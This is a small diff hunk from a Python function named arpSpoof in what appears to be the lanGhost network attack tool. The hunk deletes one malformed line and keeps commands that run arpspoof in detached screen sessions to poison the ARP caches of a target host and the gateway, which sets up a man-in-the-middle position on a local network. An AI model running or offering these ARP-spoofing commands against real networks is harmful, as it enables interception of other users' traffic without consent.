@@ -286,7 +286,6 @@ def arpSpoof(target):
     global interface
     global gw_ip
     print("[+] ARP Spoofing " + str(target[0]) + "...")
-    gw_ip target[0]
     os.system("sudo screen -S lanGhost-arp-" + target[0] + "-0 -m -d arpspoof -c " + target[0] + " -t " + gw_ip + " -i " + interface)
     os.system("sudo screen -S lanGhost-arp-" + target[0] + "-1 -m -d arpspoof -c " + gw_ip + " -t " + target[0] + " -i " + interface)
 
